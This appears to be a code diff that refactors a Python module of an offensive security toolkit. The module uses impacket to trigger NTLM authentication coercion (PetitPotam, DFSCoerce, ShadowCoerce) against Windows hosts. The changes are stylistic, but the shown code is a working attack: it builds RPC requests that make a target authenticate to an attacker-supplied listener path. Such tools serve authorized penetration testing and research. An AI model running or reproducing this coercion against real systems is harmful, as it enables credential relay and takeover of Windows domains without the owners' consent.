@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import contextlib
 import json
 from typing import Any
 
@@ -49,11 +50,10 @@ METHODS = {
 
 
 def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str, Any]:
-    from impacket.dcerpc.v5 import epm, rpcrt, transport
-    from impacket.dcerpc.v5.dtypes import NULL, WSTR
+    from impacket.dcerpc.v5 import rpcrt, transport
 
     meta = METHODS[method]
-    binding = fr"ncacn_np:{host}[{meta['endpoint']}]"
+    binding = rf"ncacn_np:{host}[{meta['endpoint']}]"
     rpc_transport = transport.DCERPCTransportFactory(binding)
     lm, nt = target.lm_nt_hashes()
     if hasattr(rpc_transport, "set_credentials"):
@@ -71,7 +71,7 @@ def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str,
     dce.connect()
     dce.bind(rpcrt.uuidtup_to_bin((meta["iface_uuid"], meta["iface_version"])))
 
-    listener_path = fr"\\{listener}\pwn\x"
+    listener_path = rf"\\{listener}\pwn\x"
     try:
         request = _build_coercion_request(method, listener_path)
         dce.request(request)
@@ -80,16 +80,19 @@ def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str,
         text = str(exc)
         if "STATUS_BAD_NETWORK_NAME" in text or "STATUS_NETWORK_PATH_NOT_FOUND" in text:
             # Expected: target attempted to reach listener.
-            return {"method": method, "listener": listener_path, "ok": True, "expected_error": text[:120]}
+            return {
+                "method": method,
+                "listener": listener_path,
+                "ok": True,
+                "expected_error": text[:120],
+            }
         return {"method": method, "listener": listener_path, "ok": False, "error": text[:200]}
     finally:
-        try:
+        with contextlib.suppress(Exception):
             dce.disconnect()
-        except Exception:  # noqa: BLE001
-            pass
 
 
-def _build_coercion_request(method: str, listener: str):
+def _build_coercion_request(method: str, listener: str) -> Any:
     if method == "petitpotam":
         from impacket.dcerpc.v5 import even6  # noqa: F401  # ensures registration
         from impacket.dcerpc.v5.efsr import EfsRpcOpenFileRaw
@@ -108,12 +111,13 @@ def _build_coercion_request(method: str, listener: str):
         req["pszLocalMachine"] = listener + "\x00"
         return req
     if method == "dfscoerce":
-        from impacket.dcerpc.v5.rpcrt import DCERPCException  # noqa: F401
+        from impacket.dcerpc.v5.dtypes import ULONG, WSTR
+
         # Minimal DFSNM NetrDfsAddStdRoot skeleton
         from impacket.dcerpc.v5.ndr import NDRCALL
-        from impacket.dcerpc.v5.dtypes import WSTR, ULONG
+        from impacket.dcerpc.v5.rpcrt import DCERPCException  # noqa: F401
 
-        class NetrDfsAddStdRoot(NDRCALL):
+        class NetrDfsAddStdRoot(NDRCALL):  # type: ignore[misc]
             opnum = 12
             structure = (
                 ("ServerName", WSTR),
@@ -129,10 +133,10 @@ def _build_coercion_request(method: str, listener: str):
         req["ApiFlags"] = 1
         return req
     if method == "shadowcoerce":
+        from impacket.dcerpc.v5.dtypes import WSTR
         from impacket.dcerpc.v5.ndr import NDRCALL
-        from impacket.dcerpc.v5.dtypes import WSTR, LONG
 
-        class IsPathSupported(NDRCALL):
+        class IsPathSupported(NDRCALL):  # type: ignore[misc]
             opnum = 8
             structure = (("ShareName", WSTR),)
 
@@ -168,16 +172,12 @@ class Coerce:
             raise RuntimeError("Pass -P listener=<attacker-host-or-ip>.")
 
         chosen = [m.strip() for m in methods.split(",") if m.strip() in METHODS]
-        console.print(
-            f"[bold]coerce[/bold] host={host} listener={listener} methods={chosen}"
-        )
+        console.print(f"[bold]coerce[/bold] host={host} listener={listener} methods={chosen}")
 
         results: list[dict[str, Any]] = []
         for method in chosen:
             outcome = _trigger(target, host, str(listener), method)
-            console.print(
-                f"  {method}: {'ok' if outcome.get('ok') else 'fail'}"
-            )
+            console.print(f"  {method}: {'ok' if outcome.get('ok') else 'fail'}")
             results.append(outcome)
 
         payload = {"host": host, "listener": listener, "results": results}
